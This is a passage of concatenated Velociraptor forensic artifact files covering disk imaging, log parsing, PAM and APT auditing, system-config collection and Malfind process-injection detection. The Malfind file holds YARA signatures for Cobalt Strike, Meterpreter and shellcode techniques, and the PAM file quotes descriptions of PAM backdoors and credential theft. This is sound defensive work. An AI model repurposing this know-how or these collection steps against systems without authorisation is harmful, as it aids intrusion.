  - https://accessdata.com/products-services/forensic-toolkit-ftk/ftkimager

type: CLIENT

tools:
  - name: FTKImager
    url: https://ad-zip.s3.amazonaws.com/FTKImager.3.1.1_win32.zip

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: SourceDriveToImage
    default: "0"

  - name: OutputPath
    default: "D:\\E01"

sources:
  - query: |
      -- get context on target binary
      LET bin <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(
                    ToolName="FTKImager")

      LET tmpdir <= tempdir()

      LET zip_file <= SELECT *
                        FROM unzip(filename=bin[0].FullPath,
                        output_directory=tmpdir)
                        WHERE OriginalPath =~ "ftkimager.exe"

      -- execute payload
        SELECT Stdout, Stderr
        FROM execve(argv=[
            zip_file.NewPath[0],
            "\\\\.\\PHYSICALDRIVE" + SourceDriveToImage,
            OutputPath])

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.UnifiedLogParser.yaml
======
name: MacOS.UnifiedLogParser
description: |

  This is a simple, un-optimized artifact that leverages Mandiant's `macos-unifiedlogs`/`unifiedlog_parser` to obtain parsed log information from macOS's Unified Log.

  From the project's description:
  
  A simple Rust library that can help parse the macOS Unified Log files.

  Unified Logs were introduced in macOS version 10.12 (Sierra, 2016). Part of Apple's goal to create a unified log format for all Apple products. They exist on macOS, iOS, watchOS, tvOS. The Unified Logs replace many of the old log formats Apple used. This simple library can be used to parse files.

  Additional information: https://github.com/mandiant/macos-UnifiedLogs

author: Wes Lambert - @therealwlambert

reference:
 - https://www.mandiant.com/resources/blog/reviewing-macos-unified-logs

required_permissions:
  - EXECVE

precondition: SELECT OS From info() where OS = 'darwin'

tools:
  - name: UnifiedLogParser
    url: https://github.com/mandiant/macos-UnifiedLogs/releases/download/v1.0.0/unifiedlog_parser

sources:
  - query: |
      LET ULP <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="UnifiedLogParser")
      LET RunULP <= SELECT * FROM execve(argv=["./" + basename(path=ULP.FullPath[0])], cwd=dirname(path=ULP.FullPath[0]))
      SELECT * FROM parse_csv(accessor="file", filename=dirname(path=ULP.FullPath[0]) + "/output.csv")

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.AngryIPScanner.yaml
======
name: Windows.Forensics.AngryIPScanner

description: |
 This Velociraptor artifact is tailored for forensic analysis of Angry IP Scanner usage on Windows platforms. This facilitates the identification of how Angry IP Scanner was configured and used, aiding in DFIR investigations. It examines HKEY_USERS\\*\\SOFTWARE\\JavaSoft\\Prefs\\ipscan from the registry for retrieve some informations about:
   
   - language: Displays the language used in the GUI, may prove useful to have an idea of the language used by a threat actor (it is necessary to correlate with a modus operandi in order not to fall into the trap of a false flag)
   - Version: Displays the version of Angry IP Scanner
   - LastVersionCheck: Captures the last time (EPOCH format in UTC +0) when the application checked for an update
   - PortScanConfiguration: Displays the selected ports for scanning


author: Julien Houry - @y0sh1mitsu (CSIRT Airbus Protect)

reference:

 - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-a-forensic-deep-dive-into-netscan-angry-ip-scanner-and-advanced-port-scanner/
 - https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-259a
 - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060a

type: CLIENT

precondition: SELECT OS FROM info() where OS = 'windows'

parameters:
    - name: RegistryPath
      type: hidden
      default: HKEY_USERS\\*\\SOFTWARE\\JavaSoft\\Prefs\\ipscan
    - name: RegistryData
      type: regex
      default: .

sources:
    - query: |
        SELECT Key.FileInfo.FullPath AS FullPath, Key.FileInfo.ModTime AS ModificationTime, language, get(field="last/Run/Version", default="Unknown") AS Version, get(field="port/String", default="Unknown") AS PortScanConfiguration, get(field="last/Version/Check", default="Unknown") AS LastVersionCheck FROM read_reg_key(globs=RegistryPath, accessor="registry") WHERE Key.FileInfo.FullPath =~ RegistryData

---END OF FILE---

======
FILE: /content/exchange/artifacts/Generic.Forensics.CyLR.yaml
======
name: Generic.Forensics.CyLR
description: |
  Uses CyLR tool to do live forensic on the host.

  Note this requires syncing the CyLR binary from the host.

tools:
  - name: Cylr_amd64
    serve_locally: true

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: TargetDir
    type: string
    default: "%SystemDrive%\\"
  - name: ZipPassword
    type: string
    default: ""
  - name: ToolInfo
    type: hidden
    description: Override Tool information.

sources:
  - query: |
      LET os_info <= SELECT Architecture,Hostname FROM info()

      // Get the path to the binary.
      LET bin <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(
              ToolName= "Cylr_" + os_info[0].Architecture,
              ToolInfo=ToolInfo)
              
      // Set necessary variables
      LET hostname = os_info[0].Hostname
      LET outputDir <= expand(path=TargetDir)
      LET outputFile = upcase(string=hostname)+".zip"
      LET logFile <= outputDir + "\\" + "CylR.log"
      LET fullOutputFile <= outputDir + "\\" + outputFile
      
      // Call the binary and return all its output in a single row.
      LET output <= SELECT * FROM execve(argv=[bin[0].FullPath, '-od', outputDir, ], cwd=outputDir, length=10000000)

      // Upload the forensic file and report additional data.
      SELECT upload(file=logFile) AS LogFile, upload(file=fullOutputFile) AS ForensicFile FROM scope()

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.System.PAM.yaml
======
name: Linux.System.PAM

description: |
   This artifact enumerates applicable lines from the files that reside in `/etc/PAM.d/`. This information can be useful for auditing and compliance purposes, or to identify suspicious activity on Linux systems.
   
   For example, we could use the `RecordFilter` parameter to check for the presence of `pam_exec.so`, which can be used within PAM configuration to invoke arbitrary scripts.  

   
   From MITRE ATT&CK:
   
   Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is PAM_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow
   
   Adversaries may modify components of the PAM system to create backdoors. PAM components, such as PAM_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.
   
   Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.
   
reference:
  - https://linux.die.net/man/5/PAM.d
  - https://attack.mitre.org/techniques/T1556/003/
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.003/T1556.003.md
  - https://book.hacktricks.xyz/linux-hardening/linux-post-exploitation#sniffing-logon-passwords-with-PAM
  
type: CLIENT
author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange

parameters:
  - name: PAMGlob
    default: /etc/pam.d/*
  - name: RecordFilter
    default: .
    description: Filter used for targeting specific records by content
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"
    
precondition:
      SELECT OS From info() where OS = 'linux'
      
sources:
  - query: |
      LET DateAfterTime <= if(condition=DateAfter,
        then=timestamp(epoch=DateAfter), else=timestamp(epoch="1600-01-01"))
      LET DateBeforeTime <= if(condition=DateBefore,
        then=timestamp(epoch=DateBefore), else=timestamp(epoch="2200-01-01"))        
      LET PAMGlobList = SELECT Mtime, OSPath
        FROM glob(globs=split(string=PAMGlob, sep=","))
      SELECT * FROM foreach(row=PAMGlobList, 
                    query={ SELECT Mtime, 
                                   OSPath, 
                                   Line AS Record
                            FROM  parse_lines(filename=OSPath) 
                            WHERE Record =~ RecordFilter
                            AND Mtime < DateBeforeTime
                            AND Mtime > DateAfterTime
                            AND NOT Record =~ '^#' 
                            AND NOT Record = ''})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Sys.APTHistory.yaml
======
name: Linux.Sys.APTHistory
description: |
   APT (Advanced Package Tool) maintains a log of software installation/removal/upgrades, as well as associated command-line invocations.
   
   This artifact parses the APT `history.log`, as well as archived history logs to provide this information.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

parameters:
   - name: APTHistoryLogs
     default: /var/log/apt/history.log*
     description: APT history log(s)
   
sources:
  - precondition:
      SELECT OS From info() where OS = 'linux'

    query: |
      LET APTHistoryList = SELECT OSPath FROM glob(globs=split(string=APTHistoryLogs, sep=","))
      LET ParseRecords = SELECT OSPath, parse_string_with_regex(
            string=Record,
            regex=['Start-Date:\\s(?P<StartDate>.+)',
                   'Commandline:\\s(?P<CommandLine>.+)',
                   'Requested-By:\\s(?P<RequestedBy>.+)',
                   'Install:\\s(?P<Install>.+)',
                   'Remove:\\s(?P<Remove>.+)',
                   'Upgrade:\\s(?P<Upgrade>.+)',
                   'End-Date:\\s(?P<EndDate>.+)']) as Event
      FROM parse_records_with_regex(accessor="gzip",file=OSPath, regex='''(?sm)^(?P<Record>Start-Date:.+?)\n\n''')
      SELECT * FROM foreach(row=APTHistoryList,query=ParseRecords)

---END OF FILE---

======
FILE: /content/exchange/artifacts/malfind.yaml
======
name: Windows.Detection.Malfind
author: Matt Green - @mgreen27
description: |
    This artifact checks the VAD for executable sections that are not maped to disk 
    and has suspicious content which may indicate process injection.
    
    User options allow targetting process, modifying suspicious content yara, or 
    upload of suspicious section.
    
    Default suspicious content includes headers: MZ, default cobalt strike stomped, 
    or well known suspicious strings, meterpreter and Cobalt Strike.
    
    Note: Add additional yara as desired.  
    Expect some false positives and triage accordingly.  
    
parameters:
  - name: ProcessRegex
    description: A regex applied to process names.
    default: .
    type: regex
  - name: PidRegex
    default: .
    type: regex
  - name: ProtectionRegex
    description: |
        Protection of section. Default is Executable but can customise for other usecases.  
        Examples: x for executable, r for read, w for write.  
        (x|r|w) or xrw for multiple.
        x-w for strict.
    default: xrw
    type: regex
  - name: SectionDataGuiSize
    description: Size of SectionData to show in gui. For large files, use UploadSection
    default: 10000
    type: int
  - name: SuspiciousContent
    description: A yara rule of suspicious section content 
    type: yara
    default: |
        rule win_cobalt_strike_auto {
         meta:
           author = "Felix Bilstein - yara-signator at cocacoding dot com"
           date = "2019-11-26"
           version = "1"
           description = "autogenerated rule brought to you by yara-signator"
           tool = "yara-signator 0.2a"
           malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike"
           malpedia_license = "CC BY-SA 4.0"
           malpedia_sharing = "TLP:WHITE"

         strings:
           $sequence_0 = { 3bc7 750d ff15???????? 3d33270000 }
           $sequence_1 = { e9???????? eb0a b801000000 e9???????? }
           $sequence_2 = { 8bd0 e8???????? 85c0 7e0e }
           $sequence_3 = { ffb5f8f9ffff ff15???????? 8b4dfc 33cd e8???????? c9 c3 }
           $sequence_4 = { e8???????? e9???????? 833d?????????? 7505 e8???????? }
           $sequence_5 = { 250000ff00 33d0 8b4db0 c1e908 }
           $sequence_6 = { ff75f4 ff7610 ff761c ff75fc }
           $sequence_7 = { 8903 6a06 eb39 33ff 85c0 762b 03f1 }
           $sequence_8 = { 894dd4 8b458c d1f8 894580 8b45f8 c1e818 0fb6c8 }
           $sequence_9 = { 890a 8b4508 0fb64804 81e1ff000000 c1e118 8b5508 0fb64205 }
           $sequence_10 = { 33d2 e8???????? 48b873797374656d3332 4c8bc7 488903 49ffc0 }
           $sequence_11 = { 488bd1 498d4bd8 498943e0 498943e8 }
           $sequence_12 = { b904000000 486bc90e 488b542430 4c8b442430 418b0c08 8b0402 }
           $sequence_13 = { ba80000000 e8???????? 488d4c2438 e8???????? 488d4c2420 8bd0 e8???????? }
           $sequence_14 = { 488b4c2430 8b0401 89442428 b804000000 486bc004 }
           $sequence_15 = { 4883c708 4883c304 49ffc3 48ffcd 0f854fffffff 488d4c2420 }

        condition:
            7 of them
        }

        rule win_meterpreter_auto {
            meta:
                author = "Felix Bilstein - yara-signator at cocacoding dot com"
                date = "2022-08-05"
                version = "1"
                description = "Detects win.meterpreter."
                info = "autogenerated rule brought to you by yara-signator"
                tool = "yara-signator v0.6.0"
                signator_config = "callsandjumps;datarefs;binvalue"
                malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.meterpreter"
                malpedia_rule_date = "20220805"
                malpedia_hash = "6ec06c64bcfdbeda64eff021c766b4ce34542b71"
                malpedia_version = "20220808"
                malpedia_license = "CC BY-SA 4.0"
                malpedia_sharing = "TLP:WHITE"

            strings:
                $sequence_0 = { e22b e5f6 4f 1c8b }
                $sequence_1 = { 90 90 90 55 e4ec 53 8b22 }
                $sequence_2 = { 50 686cd4408e ffd6 8b0d???????? 83c18a }
                $sequence_3 = { 008b35a8c19f 006860 2f 0000 52 ffd6 }
                $sequence_4 = { 8b87047945f4 6a01 50 52 c745fc00000000 ff08 98 }
                $sequence_5 = { 57 40 388bf083c4cf 86f6 }
                $sequence_6 = { 8932 8b700c 83c204 4e 3bce 74ef ff9a0c8b5c03 }
                $sequence_7 = { 043b 8801 41 0fc2049088 0135???????? 4f 75b5 }
                $sequence_8 = { 6c 50 048b 55 1491 48 }
                $sequence_9 = { 76e1 8bf0 85f6 750e }

            condition:
                7 of them
        }
        rule suspicious {
            meta:
                author = "Matt Green - @mgreen27"
                description = "Suspicious unbacked on disk executable section content"
                date = "2022-09-30"

            strings:
                $header1 = "MZ"
                $header2 = { 00 00 41 52 55 48 } // cobalt strike stomped dll

                $body1 = "This program cannot be run in DOS mode" 
                $body2 = { FC E8 8? 00 00 00 60 }     // shellcode prologe in metasploit

            condition:
                $header1 at 0 or $header2
                    or any of ($body*) 
        }
        rule shellcode_get_eip
        {
            meta:
                author = "William Ballenthin"
                email = "william.ballenthin@fireeye.com"
                license = "Apache 2.0"
                copyright = "FireEye, Inc"
                description = "Match x86 that appears to fetch $PC."

            strings:
               $x86 = { e8 00 00 00 00 (58 | 5b | 59 | 5a | 5e | 5f) }

            condition:
               $x86
        }

        rule shellcode_peb_parsing
        {
            meta:
                author = "William Ballenthin"
                email = "william.ballenthin@fireeye.com"
                license = "Apache 2.0"
                copyright = "FireEye, Inc"
                description = "Match x86 that appears to manually traverse the TEB/PEB/LDR data."

            strings:
               $peb_parsing = { (64 a1 30 00 00 00 | 64 8b (1d | 0d | 15 | 35 | 3d) 30 00 00 00 | 31 (c0 | db | c9 | d2 | f6 | ff) [0-8] 64 8b ?? 30 ) [0-8] 8b ?? 0c [0-8] 8b ?? (0c | 14 | 1C) [0-8] 8b ?? (28 | 30) }
               $peb_parsing64 = { (48 65 A1 60 00 00 00 00 00 00 00 | 65 (48 | 4C) 8B ?? 60 00 00 00 | 65 A1 60 00 00 00 00 00 00 00 | 65 8b ?? ?? 00 FF FF | (48 31 (c0 | db | c9 | d2 | f6 | ff) | 4D 31 (c0 | c9))  [0-16] 65 (48 | 4d | 49 | 4c) 8b ?? 60) [0-16] (48 | 49 | 4C) 8B ?? 18 [0-16] (48 | 49 | 4C) 8B ?? (10 | 20 | 30) [0-16] (48 | 49 | 4C) 8B ?? (50 | 60) }

            condition:
               $peb_parsing or $peb_parsing64
        }

        rule shellcode_stack_strings
        {
            meta:
                author = "William Ballenthin"
                email = "william.ballenthin@fireeye.com"
                license = "Apache 2.0"
                copyright = "FireEye, Inc"
                description = "Match x86 that appears to be stack string creation."

            strings:
                // stack string near the frame pointer.
                $ss_small_bp = /(\xC6\x45.[a-zA-Z0-9 -~]){4,}\xC6\x45.\x00/

                // dword stack string near the frame pointer.
                $ss_small_bp_dword = /(\xC7\x45.[a-zA-Z0-9 -~]\x00[a-zA-Z0-9 -~]\x00){2,}\xC7\x45..\x00\x00\x00/

                // stack strings further away from the frame pointer.
                $ss_big_bp = /(\xC6\x85.[\xF0-\xFF]\xFF\xFF[a-zA-Z0-9 -~]){4,}\xC6\x85.[\xF0-\xFF]\xFF\xFF\x00/

                // stack string near the stack pointer.
                $ss_small_sp = /(\xC6\x44\x24.[a-zA-Z0-9 -~]){4,}\xC6\x44\x24.\x00/

                // stack strings further away from the stack pointer.
                $ss_big_sp = /(\xC6\x84\x24.[\x00-\x0F]\x00\x00[a-zA-Z0-9 -~]){4,}\xC6\x84\x24.[\x00-\x0F]\x00\x00\x00/

            condition:
                $ss_small_bp or $ss_small_bp_dword or $ss_big_bp or $ss_small_sp or $ss_big_sp
        }

        rule shellcode_shikataganai_encoding
        {
            meta:
                author    = "Steven Miller"
                company   = "FireEye"
                reference = "https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html"
            strings:
                $varInitializeAndXorCondition1_XorEAX = { B8 ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 59 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 40 | 41 | 42 | 43 | 45 | 46 | 47 ) ?? }
                $varInitializeAndXorCondition1_XorEBP = { BD ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5B | 5C | 5E | 5F ) [0-50] 31 ( 68 | 69 | 6A | 6B | 6D | 6E | 6F ) ?? }
                $varInitializeAndXorCondition1_XorEBX = { BB ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5C | 5D | 5E | 5F ) [0-50] 31 ( 58 | 59 | 5A | 5B | 5D | 5E | 5F ) ?? }
                $varInitializeAndXorCondition1_XorECX = { B9 ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 48 | 49 | 4A | 4B | 4D | 4E | 4F ) ?? }
                $varInitializeAndXorCondition1_XorEDI = { BF ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5B | 5C | 5D | 5E ) [0-50] 31 ( 78 | 79 | 7A | 7B | 7D | 7E | 7F ) ?? }
                $varInitializeAndXorCondition1_XorEDX = { BA ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 50 | 51 | 52 | 53 | 55 | 56 | 57 ) ?? }
                $varInitializeAndXorCondition2_XorEAX = { D9 74 24 F4 [0-30] B8 ?? ?? ?? ?? [0-10] ( 59 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 40 | 41 | 42 | 43 | 45 | 46 | 47 ) ?? }
                $varInitializeAndXorCondition2_XorEBP = { D9 74 24 F4 [0-30] BD ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5B | 5C | 5E | 5F ) [0-50] 31 ( 68 | 69 | 6A | 6B | 6D | 6E | 6F ) ?? }
                $varInitializeAndXorCondition2_XorEBX = { D9 74 24 F4 [0-30] BB ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5C | 5D | 5E | 5F ) [0-50] 31 ( 58 | 59 | 5A | 5B | 5D | 5E | 5F ) ?? }
                $varInitializeAndXorCondition2_XorECX = { D9 74 24 F4 [0-30] B9 ?? ?? ?? ?? [0-10] ( 58 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 48 | 49 | 4A | 4B | 4D | 4E | 4F ) ?? }
                $varInitializeAndXorCondition2_XorEDI = { D9 74 24 F4 [0-30] BF ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5B | 5C | 5D | 5E ) [0-50] 31 ( 78 | 79 | 7A | 7B | 7D | 7E | 7F ) ?? }
                $varInitializeAndXorCondition2_XorEDX = { D9 74 24 F4 [0-30] BA ?? ?? ?? ?? [0-10] ( 58 | 59 | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 50 | 51 | 52 | 53 | 55 | 56 | 57 ) ?? }
            condition:
                any of them
        }
        
  - name: NumberOfHits
    description: THis artifact will stop by default at one hit. This setting allows additional hits
    default: 1
    type: int
  - name: ContextBytes
    description: Include this amount of bytes around hit as context.
    default: 0
    type: int
  - name: UploadSection
    description: Upload suspicious section.
    type: bool


sources:
  - query: |
      LET processes = SELECT Pid, Name,Exe,CommandLine,CreateTime
        FROM pslist()
        WHERE Name =~ ProcessRegex
            AND format(format="%d", args=Pid) =~ PidRegex
            AND log(message="Scanning pid %v : %v", args=[Pid, Name])

      LET hits = SELECT * FROM foreach(
          row=processes,
          query={
            SELECT CreateTime,Pid, Name,
                format(format='%x-%x', args=[Address, Address+Size]) AS AddressRange,
                Protection, Address as _Address,
                Size as SectionSize,
                pathspec(
                    DelegateAccessor="process",
                    DelegatePath=Pid,
                    Path=Address) AS _PathSpec
            FROM vad(pid=Pid)
            WHERE NOT MappingName
                AND Protection =~ ProtectionRegex
          })
          
      LET results <= SELECT *,
            format(format='% x',args=read_file(
                     accessor='offset',
                     filename=_PathSpec,
                     length=2)) as HexHeader,
            magic(path=_PathSpec, accessor='offset') as DataMagic,
            base64encode(string=read_file(
                     accessor='offset',
                     filename=_PathSpec,
                     length= if(condition= SectionDataGuiSize > SectionSize,
                                then= SectionSize,
                                else= SectionDataGuiSize)
                        )) as SectionData,
            YaraHit, _PathSpec
        FROM foreach(row=hits,
            query={
                SELECT
                    CreateTime,Pid, Name,_Address, AddressRange,Protection,SectionSize,
                    enumerate(items=dict(
                        Rule=Rule,
                        Meta=Meta,
                    	Tags=Tags,
                    	String=String)) as YaraHit,
                    _PathSpec
                FROM yara(
                            accessor='offset',
                            files=_PathSpec, 
                            rules=SuspiciousContent,
                            end=SectionSize,  key='X', 
                            number=NumberOfHits,
                            context=ContextBytes
                        )
                GROUP BY CreateTime,Pid, Name, AddressRange
            })
        
        
      LET upload_section = SELECT *,
                upload(accessor='sparse', 
                  file=pathspec(
                    DelegateAccessor="process",
                    DelegatePath=Pid,
                    Path=[dict(Offset=_Address, Length=SectionSize),]), 
                    name=format(format='%v-%v_%v.bin',args= [ Name, Pid, AddressRange ])
                    ) as SectionDump
            FROM results
            GROUP BY CreateTime,Pid, Name,_Address, AddressRange
      
      SELECT *,
        process_tracker_callchain(id=Pid).Data as ProcessChain
      FROM if(condition= UploadSection,
                then= upload_section,
                else= results)
        
column_types:
  - name: SectionData
    type: base64hex

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Hunt.Comparison.yaml
======
name: Server.Hunt.Comparison
author: Denis Kiffer

description: |
   This artifact is used to compare other artifacts from two different hunts. The basic idea is that a baseline (Hunt 1) is created from selected artifacts before an attack. A second hunt (Hunt 2) can then be carried out after the attack using the same artifacts. Now, using this script, artifacts from both hunts can be compared. This allows legitimate activities to be filtered out and makes it easier to identify malicious activities in Hunt2.
   
   Furthermore, when comparing artifacts, it is necessary to select columns (here the identifying_column) that should be used for the comparison in both artifacts, since a comparison of complete data sets leads to errors. Because many artifacts contain timestamps that update. The use of values such as hashes therefore makes sense.
   
   For example, the following artifacts and their identifying columns can be used to compare to a baseline:
   
   - Windows.System.Pslist - Hash
   - Windows.Forensics.Prefetch - Hash
   - Windows.Sysinternals.Autoruns - SHA-256
   - Windows.Sys.AllUsers - Name
   
reference:
  - https://www.sans.org/white-papers/37192/

type: SERVER

parameters:
  - name: Baseline_Hunt_1_id
    description: id of the hunt that was executed before an attack
  - name: Hunt_2_id
    description: id of hunt that was executed during or after an attack and is supposed to be compared to the Baseline_Hunt_1
  - name: Artifact_name
    description: This is the artefact that should be compared and which was executed in the Baseline_Hunt_1 and Hunt_2
  - name: Identifying_column
    description: column of the selected artefact that should be compared

sources:
  - query: |
     --Select baseline hunt
     Let Baseline = SELECT *,"Baseline" AS Sourcehunt FROM hunt_results(
       artifact=Artifact_name,
       hunt_id=Baseline_Hunt_1_id) 

     --Select second hunt to compare    
     Let Hunt2 = SELECT *, "Hunt2" AS Sourcehunt FROM hunt_results(
       artifact=Artifact_name,
       hunt_id=Hunt_2_id)

     --Get List of systems to compare to each other    
     Let Systems = SELECT Fqdn FROM Baseline GROUP BY Fqdn

     --Fuse both hunts 
     Let Hunts_fused = SELECT * FROM chain(
       a={SELECT * FROM Hunt2},
       b={SELECT * FROM Baseline},async=TRUE)

     --Loop through each system and count how many appearances of the value from the selected identifying_column there are           
     Let CountallRows = SELECT * FROM foreach(
       row=Systems.Fqdn,
       query={SELECT *, count() AS TotalCount FROM Hunts_fused WHERE Fqdn=_value GROUP BY get(member=Identifying_column)})

     --Show all lines where the value in the identifying_column only appears once
     SELECT * FROM CountallRows WHERE TotalCount=1

---END OF FILE---

======
FILE: /content/exchange/artifacts/FindFlows.yaml
======
name: Server.Findflows
author: Matt Green - @mgreen27
description: |
  This artifact enables searching over client flow results with regex
  and returns a link to the Flow for followup.

type: SERVER
parameters:
  - name: ClientData
    description: Glob for client data - may need to modify for non default installation
    default: /opt/velociraptor/clients/**
  - name: DateAfter
    type: timestamp
    description: "search for flow data after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for flow data before this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: Workers
    type: int
    default: 100
    description: Number of concurrent workers
  - name: SearchRegex
    type: regex
    description: Second option Yara choice is a Velociraptor shorthand Yara rule
    default:
  - name: FindKeywordTemplate
    type: hidden
    default: |
        rule findregex {
            strings:
                $regex = /(REPLACEME)/i

            condition:
                $regex
        }

sources:
  - query: |
      -- create regex yara for search performance
      LET FinderYara = regex_replace(source=FindKeywordTemplate,re='REPLACEME',replace=SearchRegex)

      -- time testing
      LET time_test(stamp) =
            if(condition= DateBefore AND DateAfter,
                then= stamp < DateBefore AND stamp > DateAfter,
                else=
            if(condition=DateBefore,
                then= stamp < DateBefore,
                else=
            if(condition= DateAfter,
                then= stamp > DateAfter,
                else= True
            )))


      -- first find all matching glob
      LET files <= SELECT FinderYara,FullPath, Name, Size, Mtime, Atime, Ctime, Btime
        FROM glob(globs=ClientData,nosymlink='True')
        WHERE FullPath =~ '/F\\.[^\\./]+\\.json$'
          AND NOT IsDir AND NOT IsLink
          AND
             ( time_test(stamp=Mtime)
            OR time_test(stamp=Atime)
            OR time_test(stamp=Ctime) )


      -- scan files
      LET hits <= SELECT * FROM foreach(row=files,
            query={
                SELECT
                    FileName as FullPath,
                    File.Size AS Size,Mtime,
                    str(str=String.Data) AS HitContext
                FROM yara(rules=FinderYara,files=FullPath)
                LIMIT 1
            },workers=Workers)


      -- find configuration information
      LET find_hostname(ClientId) = SELECT os_info.hostname as Hostname FROM clients() WHERE client_id = ClientId
      

      -- enrich results
      LET flows = SELECT *,
            { SELECT HitContext FROM hits WHERE FullPath = FullPath GROUP BY lowcase(string=HitContext) } as HitContext, Mtime, FullPath,
            parse_string_with_regex(string=FullPath,regex='clients/(?P<ClientId>C\\.[^/]+)/artifacts').ClientId as ClientId,
            parse_string_with_regex(string=FullPath,regex='/(?P<FlowId>F\\.[^\\.]+)\\.json$').FlowId as FlowId
        FROM hits
        WHERE ClientId AND FlowId
        GROUP BY FullPath


      -- output rows
      SELECT
            find_hostname(ClientId=ClientId)[0].Hostname as Hostname,
            HitContext,
            Mtime as FlowModTime,
            '#/collected/' + ClientId + '/' + FlowId + '/notebook' as FlowNotebook,
            ClientId,FlowId
        FROM flows


column_types:
  - name: FlowModTime
    type: timestamp
  - name: FlowNotebook
    type: url

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.SysConfig.yaml
======
name: Linux.Collection.SysConfig 
author: alternate
description: |
  Collect system configurations and upload them.
  Based on TriageSystemConfiguration from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = "linux"

parameters:
- name: APTSources
  default: |
    ["/etc/apt/sources.list", "/etc/apt/sources.list.d/*.list"]

- name: APTTrustKeys
  default: |
    ["/etc/apt/trusted.gpg.d/*.gpg", "/etc/apt/trustdb.gpg", "/usr/share/keyrings/*.gpg", "/etc/apt/trusted.gpg"]

- name: CronAtAllowDenyFiles
  default: |
    ["/etc/at.allow", "/etc/cron.allow", "/etc/cron.deny", "/etc/at.deny"]

- name: DebianPackagesStatus
  default: /var/lib/dpkg/status

- name: DebianVersion
  default: /etc/debian_version

- name: KernelModules
  default: |
    ["/etc/modules.conf", "/etc/modprobe.d/*"]

- name: LinuxCACertificates
  default: |
    ["/usr/local/share/ca-certificates/*", "/etc/ssl/certs/ca-certificates.crt", "/usr/share/ca-certificates/*"]

- name: LinuxASLREnabled
  default: /proc/sys/kernel/randomize_va_space

- name: LinuxDSDTTable
  default: /sys/firmware/acpi/tables/DSDT

- name: LinuxDHCPConfigurationFile
  default: /etc/dhcp/dhcp.conf

- name: LinuxFstab
  default: /etc/fstab

- name: LinuxGrubConfiguration
  default: |
    ["/boot/grub/grub.cfg", "/boot/grub2/grub.cfg"]

- name: LinuxInitrdFiles
  default: |
    ["/boot/initramfs*", "/boot/initrd*"]

- name: LinuxIssueFile
  default: |
    ["/etc/issue.net", "/etc/issue"]

- name: LinuxKernelBootloader
  default: |
    ["/proc/sys/kernel/bootloader_type", "/proc/sys/kernel/bootloader_version"]

- name: LinuxKernelModuleRestrictions
  default: |
    ["/proc/sys/kernel/modules_disabled", "/proc/sys/kernel/kexec_load_disabled"]

- name: LinuxKernelModuleTaintStatus
  default: /proc/sys/kernel/tainted

- name: LinuxLoaderSystemPreloadFile
  default: /etc/ld.so.preload

- name: LinuxLocalTime
  default: /etc/localtime

- name: LinuxLSBInit
  default: |
    ["/etc/init.d/*", "/etc/insserv.conf.d/**", "/etc/insserv.conf"]

- name: LinuxLSBRelease
  default: /etc/lsb-release

- name: LinuxNetworkManager
  default: |
    ["/usr/lib/NetworkManager/conf.d/name.conf", "/run/NetworkManager/conf.d/name.conf", 
     "/var/lib/NetworkManager/*", "/var/lib/NetworkManager/NetworkManager-intern.conf", 
     "/etc/NetworkManager/conf.d/name.conf", "/etc/NetworkManager/NetworkManager.conf"]

- name: LinuxPamConfigs
  default: |
    ["/etc/pam.d/common-password", "/etc/pam.conf", "/etc/pam.d/*"]

- name: LinuxPasswdFile
  default: /etc/passwd

- name: LinuxProcMounts
  default: /proc/mounts

- name: LinuxRelease
  default: |
